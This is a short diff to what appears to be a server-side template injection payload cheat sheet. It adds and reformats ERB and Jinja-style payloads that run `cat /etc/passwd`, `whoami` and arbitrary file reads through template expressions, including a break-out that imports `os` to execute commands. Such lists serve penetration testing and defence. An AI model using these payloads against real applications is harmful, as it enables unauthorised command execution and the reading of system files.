@@ -48,8 +48,12 @@ ${{7*7}}
 
 SomePayloads:
 ```
-Read File --- <%= system('cat /etc/passwd') %>
-CerrarQuery+ConcatenarOtra -- user.first_name}}{%import os%}{{os.system('cat /etc/passwd')}}
+Read File --- 
+
+<%= system('cat /etc/passwd') %>
+
+CerrarQuery+ConcatenarOtra --- 
+user.first_name}}{%import os%}{{os.system('cat /etc/passwd')}}
 ```
 
 
@@ -120,6 +124,7 @@ ERB (Ruby):
 <%= system("whoami") %>
 <%= Dir.entries('/') %>
 <%= File.open('/example/arbitrary-file').read %>
+<%= system('cat /etc/passwd') %>
 
 Django Tricks (Python):
 {% debug %}
